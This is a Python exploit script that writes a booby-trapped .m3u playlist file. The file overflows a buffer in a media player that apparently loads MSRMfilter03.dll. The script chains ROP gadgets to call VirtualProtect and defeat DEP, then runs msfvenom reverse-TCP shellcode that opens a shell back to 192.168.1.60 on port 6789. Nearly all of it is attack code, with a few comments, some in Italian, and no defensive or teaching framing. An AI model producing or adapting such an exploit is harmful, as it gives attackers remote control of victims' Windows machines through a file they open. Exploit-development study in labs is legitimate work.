#!/usr/bin/python 
import struct

file = "crash1.m3u"
f = open(file , "wb")

CRASH_LEN = 30000  # change me

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00\x09\x0A' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xda\xcb\xba\xdd\xd8\x47\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x53\x17\x03\x53\x17"
shellcode += b"\x83\x36\x24\xa5\x25\x34\x3d\xa8\xc6\xc4\xbe"
shellcode += b"\xcd\x4f\x21\x8f\xcd\x34\x22\xa0\xfd\x3f\x66"
shellcode += b"\x4d\x75\x6d\x92\xc6\xfb\xba\x95\x6f\xb1\x9c"
shellcode += b"\x98\x70\xea\xdd\xbb\xf2\xf1\x31\x1b\xca\x39"
shellcode += b"\x44\x5a\x0b\x27\xa5\x0e\xc4\x23\x18\xbe\x61"
shellcode += b"\x79\xa1\x35\x39\x6f\xa1\xaa\x8a\x8e\x80\x7d"
shellcode += b"\x80\xc8\x02\x7c\x45\x61\x0b\x66\x8a\x4c\xc5"
shellcode += b"\x1d\x78\x3a\xd4\xf7\xb0\xc3\x7b\x36\x7d\x36"
shellcode += b"\x85\x7f\xba\xa9\xf0\x89\xb8\x54\x03\x4e\xc2"
shellcode += b"\x82\x86\x54\x64\x40\x30\xb0\x94\x85\xa7\x33"
shellcode += b"\x9a\x62\xa3\x1b\xbf\x75\x60\x10\xbb\xfe\x87"
shellcode += b"\xf6\x4d\x44\xac\xd2\x16\x1e\xcd\x43\xf3\xf1"
shellcode += b"\xf2\x93\x5c\xad\x56\xd8\x71\xba\xea\x83\x1d"
shellcode += b"\x0f\xc7\x3b\xde\x07\x50\x48\xec\x88\xca\xc6"
shellcode += b"\x5c\x40\xd5\x11\xa2\x7b\xa1\x8d\x5d\x84\xd2"
shellcode += b"\x84\x99\xd0\x82\xbe\x08\x59\x49\x3e\xb4\x8c"
shellcode += b"\xde\x6e\x1a\x7f\x9f\xde\xda\x2f\x77\x34\xd5"
shellcode += b"\x10\x67\x37\x3f\x39\x02\xc2\xa8\x86\x7b\xcd"
shellcode += b"\x14\x6f\x7e\xcd\x7e\xea\xf7\x2b\x14\xe4\x51"
shellcode += b"\xe4\x81\x9d\xfb\x7e\x33\x61\xd6\xfb\x73\xe9"
shellcode += b"\xd5\xfc\x3a\x1a\x93\xee\xab\xea\xee\x4c\x7d"
shellcode += b"\xf4\xc4\xf8\xe1\x67\x83\xf8\x6c\x94\x1c\xaf"
shellcode += b"\x39\x6a\x55\x25\xd4\xd5\xcf\x5b\x25\x83\x28"
shellcode += b"\xdf\xf2\x70\xb6\xde\x77\xcc\x9c\xf0\x41\xcd"
shellcode += b"\x98\xa4\x1d\x98\x76\x12\xd8\x72\x39\xcc\xb2"
shellcode += b"\x29\x93\x98\x43\x02\x24\xde\x4b\x4f\xd2\x3e"
shellcode += b"\xfd\x26\xa3\x41\x32\xaf\x23\x3a\x2e\x4f\xcb"
shellcode += b"\x91\xea\x6f\x2e\x33\x07\x18\xf7\xd6\xaa\x45"
shellcode += b"\x08\x0d\xe8\x73\x8b\xa7\x91\x87\x93\xc2\x94"
shellcode += b"\xcc\x13\x3f\xe5\x5d\xf6\x3f\x5a\x5d\xd3"


rop_nop = struct.pack("<I",0x100102DC) # RET from MSRMfilter03

#\x00\x09\x0a
payload = b"A" * 26057
payload += rop_nop # EIP
payload += b"\x90" * 4 #padding

#Salvo ESP in EDI ed EAX
payload += struct.pack("<I",0x77371b2e)  # PUSH ESP # POP ESI # RETN    ** [KERNEL32.DLL] **
payload += struct.pack("<I",0x771cb29a) # MOV EDI,ESI # DEC ECX # RETN 0x0C    **
payload += rop_nop #padding for 0x0c
payload += rop_nop #padding for 0x0c
payload += rop_nop #padding for 0x0c
payload += rop_nop #padding for 0x0c
payload += struct.pack("<I",0x75bebe2b)  # MOV EAX,ESI # POP ESI # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x41414141) # padding for pop ESI


#jump over VirtualProtect
payload += struct.pack("<I",0x100201a3)  # ADD ESP,1C # RETN    ** [MSRMfilter03.dll] ** 

# Calling VirtualProtect with parameters
payload += struct.pack('<L', 0x77325c90)    # kernel32.VirtualProtect()
payload += struct.pack('<L', 0x11111111)    # return address
payload += struct.pack('<L', 0x22222222)    # lpAddress (same as before)
payload += struct.pack('<L', 0x33333333)    # size of shellcode (0x500 is ok)
payload += struct.pack('<L', 0x44444444)    # flNewProtect (0x40)
payload += struct.pack('<L', 0x1006ad10)    # pOldProtect (any writeable address)

payload += b"\x90" * 4

#EDI point to return Address
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 
payload += struct.pack('<L',0x7752e7e0)  # INC EDI # RETN    ** [ntdll.dll] ** 

#EAX will point to lpAddress
payload += struct.pack('<L',0x75be28d8)  # ADD EAX,20 # POP EBP # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] ** 
payload += struct.pack('<L',0x771c28ee)  # INC EAX # RETN    ** [USER32.dll] **

#EAX will point to an address equal or inside NOP sled
#copio EAX in ECX per salvarne il valore
#ECX will point to lpAddress
payload += struct.pack('<L',0x774771b2)  # MOV ECX,EAX # MOV EAX,ECX # POP EBP # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack('<L',0x75be5de6)  # ADD EAX,0C8 # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack('<L',0x75be5de6)  # ADD EAX,0C8 # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack('<L',0x75be5de6)  # ADD EAX,0C8 # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack('<L',0x75be28d8)  # ADD EAX,20 # POP EBP # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x41414141) # padding for pop bp
payload += struct.pack('<L',0x75be28d8)  # ADD EAX,20 # POP EBP # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x41414141) # padding for pop bp


#EAX --> [EDI]
payload += struct.pack("<I",0x77189c93)  # MOV DWORD PTR [EDI],EAX # POP EDI # POP ESI # RETN    ** [USER32.dll] ** 
payload += struct.pack("<I",0x41414141) # padding for pop edi
payload += struct.pack("<I",0x41414141) # padding for pop esi

#EAX -> [ECX]
payload += struct.pack("<I",0x1002b67d)  # MOV DWORD PTR [ECX],EAX # RETN    ** [MSRMfilter03.dll] ** 

#dwSize
payload += struct.pack("<I",0x10025b9c)  # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x1002dc4c)  # ADD EAX,100 # POP EBP # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack("<I",0x1002dc4c)  # ADD EAX,100 # POP EBP # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack("<I",0x1002dc4c)  # ADD EAX,100 # POP EBP # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack("<I",0x1002dc4c)  # ADD EAX,100 # POP EBP # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack("<I",0x1002dc4c)  # ADD EAX,100 # POP EBP # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack("<I",0x1002dc4c)  # ADD EAX,100 # POP EBP # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x41414141) # padding for pop ebp
#aumento ecx di 40 per puntare a dwsize
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
#EAX --> [ECX]
payload += struct.pack("<I",0x1002b67d) # MOV DWORD PTR [ECX],EAX # RETN    ** [MSRMfilter03.dll] ** 

#flNewProtect  
payload += struct.pack("<I",0x10025b9c)  # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **
payload += struct.pack("<I",0x75be28d8)  # ADD EAX,20 # POP EBP # RETN    ** [MSVCRT.dll] **  
payload += struct.pack("<I",0x41414141) # padding for pop ebp
payload += struct.pack("<I",0x75be28d8)  # ADD EAX,20 # POP EBP # RETN    ** [MSVCRT.dll] **  
payload += struct.pack("<I",0x41414141) # padding for pop ebp
#incremento di 4 ecx
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] ** 
payload += struct.pack("<I",0x75bc0778)  # INC ECX # RETN    ** [MSVCRT.dll] **
#EAX --> [ECX]
payload += struct.pack("<I",0x1002b67d) # MOV DWORD PTR [ECX],EAX # RETN    ** [MSRMfilter03.dll] ** 

#ESP to VirtualProtect
payload += struct.pack("<I",0x100219f9)  # MOV EAX,ECX # RETN    ** [MSRMfilter03.dll] **  
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] ** 
payload += struct.pack("<I",0x775157d7)  # DEC EAX # RETN    ** [ntdll.dll] **
payload += struct.pack("<I",0x1002be41)  # XCHG EAX,ESP # RETN    ** [MSRMfilter03.dll] **

payload += b"\x90" * 250 # compensate

payload += shellcode

payload += b"C" * (CRASH_LEN - len(payload))

f.write(payload)
f.close()
